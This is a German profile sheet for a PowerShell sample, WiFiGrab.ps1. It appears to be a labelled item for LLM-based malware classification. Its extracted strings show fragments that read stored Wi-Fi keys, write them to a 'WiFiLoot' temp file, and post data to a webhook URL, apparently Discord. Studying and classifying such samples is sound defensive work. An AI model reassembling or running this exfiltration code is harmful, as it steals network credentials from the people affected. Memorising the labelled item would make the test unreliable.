# Steckbrief: tech_062_WiFiGrab.ps1

- SHA256: `75cd8be604202593bff06ca6cccb8085f1923735d1a3057055bda200f5f291ed`
- Groesse: 1308 Bytes, 41 Zeilen
- Ground-Truth-Label (aus Ordner): **techniques**
- Kein Urteil enthalten. Bewertung erfolgt durch das LLM.

## Stufe 1 - Reine Extraktion
- Strings gesamt: 7 (Auszug unten)
- Base64-Bloecke gesamt: 0, davon dekodierbar: 0
- Strings (Auszug):
  - `$networkName`
  - `Key Content`
  - `.*:\s*(.*)`
  - `
    $hostname = $env:COMPUTERNAME
    $date = Get-Date -Format "yyyyMMdd"
    $filename = "$env:TEMP\WiFiLoot-$hostn`
  - ` = $env:username
        `
  - ` = $text
    }

    if (-not ([string]::IsNullOrEmpty($text))){
        Invoke-RestMethod -ContentType `
  - ` -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)
    }

    if (-not ([string]::IsNullOrEmpty($file))){
  `

## Stufe 2 - Statische Merkmale (zusaetzlich)
- Auffaellige Tokens (Name: Vorkommen):
  - invoke_webrequest: 1
- Pfade: `$env:COMPUTERNAME`, `$env:TEMP\WiFiLoot-$env:COMPUTERNAME-$(Get-Date`, `$env:TEMP\WiFiLoot-$hostname-$date.txt`, `$env:username`
- Cmdlets: Get-Date, Get-NetConnectionProfile, Invoke-RestMethod, Out-File, Select-String, Upload-Discord, Write-Output

## Stufe 3 - Struktur (zusaetzlich)
- Beobachtete Abfolge:
  1. Web-Anfrage senden
